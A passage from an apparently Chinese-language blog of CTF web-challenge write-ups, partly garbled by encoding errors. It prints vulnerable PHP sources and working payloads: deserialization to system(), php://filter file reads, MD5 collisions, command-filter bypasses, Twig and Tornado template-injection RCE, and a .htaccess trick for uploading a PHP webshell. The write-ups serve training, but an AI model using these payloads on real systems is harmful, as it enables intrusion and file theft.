href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-23">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-23</a> 00.33.29.png)</p><p>å°è¯•æ„é€ æˆåŠŸï¼Œä½†æ²¡æœ‰å‘ç°flagï¼Œæœç´¢ä¸€ä¸‹å‘ç°åœ¨/tmp/flagoefiu4r93</p><pre class="line-numbers language-none"><code class="language-none">payload:POSTfunc&#x3D;unserialize&amp;p&#x3D;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;tac &#x2F;tmp&#x2F;flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-23">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-23</a> 00.36.23.png)</p><h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p>é€‰çŒ«çŒ«æˆ–ç‹—ç‹—åurlä¸­å‡ºç°æ³¨å…¥ç‚¹ï¼Œå°è¯•è¯»å–æ–‡ä»¶</p><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-25">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-25</a> 23.42.45.png)</p><p>ä¼¼ä¹ä¼šè‡ªåŠ¨è¡¥åç¼€ï¼Œå»æ‰.phpï¼Œè¯»å–æºç </p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?php$file &#x3D; $_GET[&#39;category&#39;];if(isset($file))&#123;if( strpos( $file, &quot;woofers&quot; ) !&#x3D;&#x3D;  false || strpos( $file, &quot;meowers&quot; ) !&#x3D;&#x3D;  false || strpos( $file, &quot;index&quot;))    &#123;include ($file . &#39;.php&#39;);&#125;else&#123;echo &quot;Sorry, we currently only support woofers and meowers.&quot;;&#125;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åŒ…å«çš„æ¡ä»¶æ˜¯å‚æ•°ä¸­æœ‰woofersï¼Œmeowersæˆ–è€…indexï¼Œä»»é€‰ä¸€ä¸ªæ„é€ payloadï¼Œå†ä½¿ç”¨è¿‡æ»¤å™¨base64ç¼–ç å°±å¯ä»¥</p><pre class="line-numbers language-none"><code class="language-none">payload:?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index&#x2F;..&#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>å•¥ä¹Ÿæ²¡æœ‰å…ˆæ‰«å§ï¼Œæ‰«å‡º.gitï¼Œgithackè·‘ä¸€ä¸‹ï¼Œçœ‹æºç </p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&#x2F;&#x2F;index.php&lt;?php$flag &#x3D; file_get_contents(&#39;&#x2F;flag&#39;);$yds &#x3D; &quot;dog&quot;;$is &#x3D; &quot;cat&quot;;$handsome &#x3D; &#39;yds&#39;;foreach($_POST as $x &#x3D;&gt; $y)&#123;    $$x &#x3D; $y;&#125;foreach($_GET as $x &#x3D;&gt; $y)&#123;    $$x &#x3D; $$y;&#125;foreach($_GET as $x &#x3D;&gt; $y)&#123;    if($_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; $x &amp;&amp; $x !&#x3D;&#x3D; &#39;flag&#39;)&#123;        exit($handsome);    &#125;&#125;if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;]))&#123;    exit($yds);&#125;if($_POST[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;  || $_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;)&#123;    exit($is);&#125;echo &quot;the flag is: &quot;.$flag;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”¨ç¬¬äºŒä¸ªåˆ¤æ–­ï¼Œ$yds=$flagå³å¯</p><pre class="line-numbers language-none"><code class="language-none">payload:?yds&#x3D;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢"><a href="#å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢" class="headerlink" title="[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢"></a>[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢</h2><p>ä¸‹è½½æºç ï¼Œ3000ä¸ªæ–‡ä»¶ï¼Œæ‰“å¼€çœ‹å†…å®¹ä¸­æœ‰è®¸å¤ševalå‡½æ•°ï¼Œä½†æ˜¯æ‰§è¡Œæ—¶å†…å®¹ä¸ä¸€å®šå¯ç”¨ï¼Œç¼–å†™è„šæœ¬è¿›è¡Œæµ‹è¯•</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> requests<span class="token keyword">import</span> repath<span class="token operator">=</span><span class="token string">"C:\phpstudy_pro\WWW\src\\"</span>files<span class="token operator">=</span>os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> files<span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token operator">+</span>i<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            gets <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'\$_GET\[\'(.*?)\'\]'</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            posts <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'\$_POST\[\'(.*?)\'\]'</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span>    data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    parm<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> gets<span class="token punctuation">:</span>        parm<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"echo 'jlanhere';"</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> posts<span class="token punctuation">:</span>        data<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"echo 'jlanhere';"</span>    tex<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"http://src/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>params<span class="token operator">=</span>parm<span class="token punctuation">)</span><span class="token punctuation">.</span>text    <span class="token keyword">if</span> <span class="token string">"jlanhere"</span> <span class="token keyword">in</span> tex<span class="token punctuation">:</span>        tp<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> k <span class="token keyword">in</span> gets<span class="token punctuation">:</span>            tp <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>            tp<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"echo 'jlanhere';"</span>            textt <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"http://src/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span>params<span class="token operator">=</span>tp<span class="token punctuation">)</span><span class="token punctuation">.</span>text            <span class="token keyword">if</span> <span class="token string">"jlanhere"</span> <span class="token keyword">in</span> textt<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"get"</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span>                exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> k <span class="token keyword">in</span> posts<span class="token punctuation">:</span>            tp <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>            tp<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"echo 'jlanhere';"</span>            textt <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"http://src/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span>data<span class="token operator">=</span>tp<span class="token punctuation">)</span><span class="token punctuation">.</span>text            <span class="token keyword">if</span> <span class="token string">"jlanhere"</span> <span class="token keyword">in</span> textt<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"post"</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span>                exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰¾å‡ºä¸€ä¸ªæ³¨å…¥ç‚¹</p><pre class="line-numbers language-none"><code class="language-none">payload:xk0SzyKwfzw.php?Efa5BVG&#x3D;cat &#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h2 id="å®‰æ´µæ¯-2019-easy-web"><a href="#å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_web"></a>[å®‰æ´µæ¯ 2019]easy_web</h2><p>çœ‹çœ‹ä¼ å‚ï¼Œimgçš„å†…å®¹æ˜¯è¢«hexç¼–ç åå†ç”¨ä¸¤æ¬¡base64ç¼–ç å¾—åˆ°çš„ï¼Œè§£ç å†…å®¹å¦‚ä¸‹</p><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-26">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-26</a> 23.02.28.png)</p><p>å°è¯•å°†index.phpç¼–ç ä¼ å…¥ï¼Œå¾—åˆ°æºç </p><pre class="line-numbers language-php+html" data-language="php+html"><code class="language-php+html">&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);$cmd &#x3D; $_GET[&#39;cmd&#39;];if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;]))     header(&#39;Refresh:0;url&#x3D;.&#x2F;index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;&#39;);$file &#x3D; hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));$file &#x3D; preg_replace(&quot;&#x2F;[^a-zA-Z0-9.]+&#x2F;&quot;, &quot;&quot;, $file);if (preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $file)) &#123;    echo &#39;&lt;img src &#x3D;&quot;.&#x2F;ctf3.jpeg&quot;&gt;&#39;;    die(&quot;xixiï½ no flag&quot;);&#125; else &#123;    $txt &#x3D; base64_encode(file_get_contents($file));    echo &quot;&lt;img src&#x3D;&#39;data:image&#x2F;gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;    echo &quot;&lt;br&gt;&quot;;&#125;echo $cmd;echo &quot;&lt;br&gt;&quot;;if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\&#96;|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123;    echo(&quot;forbid ~&quot;);    echo &quot;&lt;br&gt;&quot;;&#125; else &#123;    if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;        echo &#96;$cmd&#96;;    &#125; else &#123;        echo (&quot;md5 is funny ~&quot;);    &#125;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç›´æ¥çœ‹å…³é”®ï¼Œmd5å¼ºç›¸ç­‰ç»•è¿‡</p><pre class="line-numbers language-none"><code class="language-none">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2æˆ–a&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ç„¶åå°±æ˜¯å‘½ä»¤ç»•è¿‡ï¼Œä½¿ç”¨åæ–œæ ç»•è¿‡cat</p><pre class="line-numbers language-none"><code class="language-none">payload:?cmd&#x3D;ca\t &#x2F;flagPOST:a&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p>ç›´æ¥æµ‹è¯•å‡ºSSTIï¼Œä½†æ˜¯è¿™ä¸ªæ¸²æŸ“æ¡†æ¶ä¸æ˜¯flaskçš„ï¼Œç°æºœæºœå»çœ‹wpï¼Œå‘ç°æ˜¯phpçš„twigæ¸²æŸ“æ¨¡ç‰ˆï¼Œç›´æ¥åœ¨cookieå¤„æ”¾payloadå³å¯</p><pre class="line-numbers language-none"><code class="language-none">payload:Cookie: user&#x3D;&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat &#x2F;flag&quot;)&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="WUSTCTF2020-æœ´å®æ— å"><a href="#WUSTCTF2020-æœ´å®æ— å" class="headerlink" title="[WUSTCTF2020]æœ´å®æ— å"></a>[WUSTCTF2020]æœ´å®æ— å</h2><p>robots.txt-&gt;fAke_f1agggg.php-&gt;fl4g.php</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php header(&#39;Content-type:text&#x2F;html;charset&#x3D;utf-8&#39;); error_reporting(0); highlight_file(__file__); &#x2F;&#x2F;level 1 if (isset($_GET[&#39;num&#39;]))&#123;     $num &#x3D; $_GET[&#39;num&#39;];     if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123;         echo &quot;æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;&#x2F;br&gt;&quot;;     &#125;else&#123;         die(&quot;é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜&quot;);     &#125; &#125;else&#123;     die(&quot;å»éæ´²å§&quot;); &#125; &#x2F;&#x2F;level 2 if (isset($_GET[&#39;md5&#39;]))&#123;    $md5&#x3D;$_GET[&#39;md5&#39;];    if ($md5&#x3D;&#x3D;md5($md5))        echo &quot;æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;&#x2F;br&gt;&quot;;    else        die(&quot;æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²&quot;); &#125;else&#123;     die(&quot;å»éæ´²å§&quot;); &#125; &#x2F;&#x2F;get flag if (isset($_GET[&#39;get_flag&#39;]))&#123;     $get_flag &#x3D; $_GET[&#39;get_flag&#39;];     if(!strstr($get_flag,&quot; &quot;))&#123;         $get_flag &#x3D; str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);         echo &quot;æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;&#x2F;br&gt;&quot;;         system($get_flag);     &#125;else&#123;         die(&quot;å¿«åˆ°éæ´²äº†&quot;);     &#125; &#125;else&#123;     die(&quot;å»éæ´²å§&quot;); &#125; ?&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é¦–å…ˆintvalå‡½æ•°ç‰¹æ€§</p><pre class="line-numbers language-none"><code class="language-none">intval(&#39;2e4&#39;)&#x3D;2intval(&#39;2e4&#39;+1)&#x3D;20001å› ä¸ºåœ¨æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤æ—¶ç›¸å½“äºå…ˆæ‰§è¡Œäº†int(&#39;2e4&#39;)&#x3D;20000å†åŠ ä¸€æ‰€ä»¥ç¬¬ä¸€ä¸ªç»•è¿‡num&#x3D;2e4å³å¯<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ç¬¬äºŒä¸ªmd5å¼±ç›¸ç­‰ç»•è¿‡</p><pre class="line-numbers language-none"><code class="language-none">$md5&#x3D;md5($md5)å¼€å¤´æ˜¯0eå¹¶ä¸”md5åä¹Ÿæ˜¯0eå³å¯0e215962017<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æœ€åç©ºæ ¼ç»•è¿‡å’Œcatç»•è¿‡</p><pre class="line-numbers language-none"><code class="language-none">payload:fl4g.php?num&#x3D;2e4&amp;md5&#x3D;0e215962017&amp;get_flag&#x3D;tac$&#123;IFS&#125;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>[æŠ¤ç½‘æ¯ 2018]easy_tornado</h2><p>è¿›å»ä¸‰ä¸ªæ–‡ä»¶</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;flag.txtï¼šflag in &#x2F;fllllllllllllag&#x2F;welcome.txtï¼šrender&#x2F;hints.txtï¼šmd5(cookie_secret+md5(filename))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ç‚¹å‡»æ–‡ä»¶æŸ¥çœ‹é“¾æ¥ä¼ å‚ï¼Œå¾ˆæ˜æ˜¾æ˜¯æ–‡ä»¶åå’Œå¯¹åº”çš„<code>md5(cookie_secret+md5(filename))</code>æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰¾åˆ°<code>cookie_secret</code>è¿™ä¸€å˜é‡çš„å€¼ï¼Œå†çœ‹welcomeä¸­æœ‰renderï¼Œæ€€ç–‘æ˜¯SSTIï¼Œæ›´æ”¹ä¼ å‚å†…å®¹ï¼Œå‡ºç°erroré¡µé¢ï¼Œæµ‹è¯•SSTIæˆåŠŸ</p><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-28">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-28</a> 22.29.11.png)</p><p>åœ¨æŸ¥æ‰¾tornadoè·å–ç¯å¢ƒå˜é‡åœ¨handler.settingsä¸­ï¼Œç›´æ¥æ„é€ </p><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-28">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-28</a> 22.31.47.png)</p><p>åœ¨æŒ‰ç…§hintsä¸­å†…å®¹æ„é€ hashå³å¯</p><pre class="line-numbers language-none"><code class="language-none">payload:file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;da1ca88f71d944d0819a420a222fc69c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h2><p>Apacheè§£ææ¼æ´</p><pre class="line-numbers language-none"><code class="language-none">#.htaccess&lt;FilesMatch &quot;shell.png&quot;&gt;SetHandler application&#x2F;x-httpd-php&lt;&#x2F;FilesMatch&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸Šä¼ åèšå‰‘è¿æ¥å³å¯</p><h2 id="BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"><a href="#BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤" class="headerlink" title="[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"></a>[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</h2><p>å…ˆçœ‹ä»£ç </p><pre class="line-numbers language-php" data-language="php"><code class="language-php">//index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$text</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string double-quoted-string">"I have a dream"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;h1>"</span><span class="token operator">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/h1>&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Not now!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//next.php</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ„é€ å…ˆè¯»å–next.phpä¸­çš„å†…å®¹</p><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;next.php&amp;text&#x3D;php:&#x2F;&#x2F;inputPOST:I have a dream<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">//next.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token 